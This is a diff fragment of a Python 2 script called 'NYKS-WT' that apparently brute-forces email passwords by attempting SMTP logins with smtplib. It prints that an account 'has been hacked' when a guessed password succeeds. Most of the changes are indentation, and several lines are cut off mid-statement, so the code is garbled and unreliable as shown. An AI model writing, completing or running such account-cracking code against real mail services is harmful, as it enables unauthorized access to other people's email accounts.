@@ -1,6 +1,10 @@
+
+#!/usr/bin/python
+
+
 import smtplib
 from os import system
-                                                          >
+                                                                     >
 def main():
    print '===================NYKS-WT======================'
 main()
@@ -27,14 +31,14 @@ def login():
          system('clear')
          main()
          print '\n'
-         print '[+] This Account Has Been Hacked Password >
+         print '[+] This Account Has Been Hacked Password :' + passwo>
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-print '[+] this account has been hacked, password :' + pa>
+            print '[+] this account has been hacked, password :' + pa>
                                                                      >
             break
          else:
